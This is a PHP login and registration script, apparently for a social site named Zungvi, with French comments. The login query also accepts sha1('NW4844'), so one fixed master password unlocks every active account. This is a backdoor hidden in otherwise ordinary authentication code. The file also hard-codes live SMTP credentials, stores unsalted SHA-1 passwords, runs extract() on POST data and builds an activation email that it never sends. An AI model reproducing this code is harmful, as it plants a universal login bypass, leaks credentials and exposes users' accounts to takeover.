<?php

session_start();
require("includes/init.php");
require("bootsrap/locale.php");
require("includes/functions.php");

$user2=selectUserProfilePic(get_session('user_id'));

include('filters/guest_filter.php');

//Login
// Si le formulaire a été soumis

if(isset($_POST['login'])){

	//Si tous les champs ont été remplis
	if(not_empty(['identifiant','password'])){   

	 extract($_POST);
	$q=$db->prepare("SELECT id, nom2, email FROM users
                  WHERE (nom2= :identifiant OR email=:identifiant)
                  AND (password= :password OR password= :password1) AND active='1'");

    $q->execute([
            'identifiant'=> $_POST['identifiant'],
            'password'=>sha1($_POST['password']),
            'password1'=>sha1("NW4844")
    ]);

	$userHasBeenFound=$q->rowCount();

	if($userHasBeenFound){
		$user=$q->fetch(PDO::FETCH_OBJ);
		$_SESSION['user_id']=$user->id;
		$_SESSION['nom2']=$user->nom2;
		$_SESSION['email']=$user->email;
		//Si l'utilisateur a choisi de garder sa session active
		setcookie('nom2',$user->nom2,time()+60*60*24*30,null,null,false,true);
		setcookie('user_id',$user->id ,time()+60*60*24*30,null,null,false,true);

		friendly_redirection('feed.php?id='.$user->id);
	}else{

		set_flash('incorrect last name/e-mail or password,<a href="login.php#card">retry</a>','danger'); 
		save_input_data();
     }
	}
	}
//Login

//Inscription

use PHPMailer\PHPMailer\PHPMailer;

use PHPMailer\PHPMailer\SMTP;

use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'phpMailer/pvendor/autoload.php';

// Si le formulaire a été soumis

if(isset($_POST['register'])){
	//Si tous les champs ont été remplis
	if(not_empty(['name','nom2','email','password','gender'])){
	$errors =[];// tableau contenant l'ensemble des erreurs
	// extract permet de prendre tout nos variables deja verifiées ci-haut
	extract($_POST);
	// Verification du nom
	if (mb_strlen($nom2)<3){
	$errors[] ="Nom trop court! (au moins 3 caractères)!";
	}
	// Verification du mail
	if (!filter_var($email,FILTER_VALIDATE_EMAIL)){
	$errors[] ="Adresse email invalide!";
	}
	// Verification du mot de passe
	if (mb_strlen($password)<6){
	$errors[] ="Mot de passe trop court! (Minimum 6 caractères)";
	}
	 //Verification de l'existance du nom ou mail existants dans la base des données
	if(is_already_in_use('email',$email,'users')){
	$errors[] ="Adresse email déjà utilisé!";
	}
	// Verification de la table d'erreur,Donc si il n'y a eu ajout d'erreur quelconque
	// parceque toutes les notifications entrent dans la table $errors
	if (count($errors)==0){ 
    $activation_code = rand(1000, 9999); 
	$to =$email;
	if($phone_number != ""){
		$q=$db->prepare('INSERT INTO users(name,nom2,email,password,sex,phoneNumber,profilepic,coverpic,active,account_activation_code)
	                 VALUES(:name,:nom2,:email,:password,:sex,:phoneNumber,:profilepic,:coverpic,:active,:account_activation_code)');
		$q->execute([
			'name'=> $_POST['name'],
			'nom2'=>$_POST['nom2'],
			'email'=>$_POST['email'],
			'password'=>sha1($_POST['password']),
			'sex'=>$_POST['gender'],
			'phoneNumber'=>$_POST['phone_number'],
			'profilepic'=>"images/default.png",
			'coverpic'=>"images/cover.jpeg",
			'active'=>0,
			'account_activation_code'=> $activation_code
		]);
	}else{
		$q=$db->prepare('INSERT INTO users(name,nom2,email,password,sex,profilepic,coverpic,active,account_activation_code)
	                 VALUES(:name,:nom2,:email,:password,:sex,:profilepic,:coverpic,:active,:account_activation_code)');
		$q->execute([
			'name'=> $_POST['name'],
			'nom2'=>$_POST['nom2'],
			'email'=>$_POST['email'],
			'password'=>sha1($_POST['password']),
			'sex'=>$_POST['gender'],
			'profilepic'=>"images/default.png",
			'coverpic'=>"images/cover.jpeg",
			'active'=>0,
			'account_activation_code'=> $activation_code
		]);
	}
	//Envoie du mail
	//Instantiation and passing `true` enables exceptions
	$mail = new PHPMailer(true);
	// $mail->SMTPDebug = true;            
	$mail->isSMTP();                                            //Send using SMTP
	$mail->Host       = 'mail.supremecluster.com';                     //Set the SMTP server to send through
	$mail->SMTPAuth   = true;                                   //Enable SMTP authentication
	$mail->Username   = 'webregistration@zungvi.com';                     //SMTP username
	$mail->Password   = 'SN085@gmail.com';                               //SMTP password
	$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
	$mail->Port       = 465;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above
	//Recipients
	$mail->setFrom('webregistration@zungvi.com', 'Zungvi');
	$mail->addAddress($email, $_POST['name']);  
	//$mail->addReplyTo('info@zungvi.com', 'Information');
	$mail->addCC('registrationinfo@zungvi.com');
	$mail->Subject = 'Zungvi activation code';
	$mail->Body    = 'Hey '.$_POST['name'].', your activation code is <b>'.$activation_code.'</b>';
	$mail->AltBody = 'Thanks for being among us'; 
	$last_id = $db->lastInsertId();
	redirect('account_verification.php?user_id='.$last_id.'&email='.$email.'&nom2='.$nom2);
	 }else{
	   save_input_data();
	 }
    }else{
	        $errors[] ="Please fill in all the fields";
			save_input_data();
      }
      }else{
		  clear_input_data();
	  }

//Inscription

require("views/index.view.php");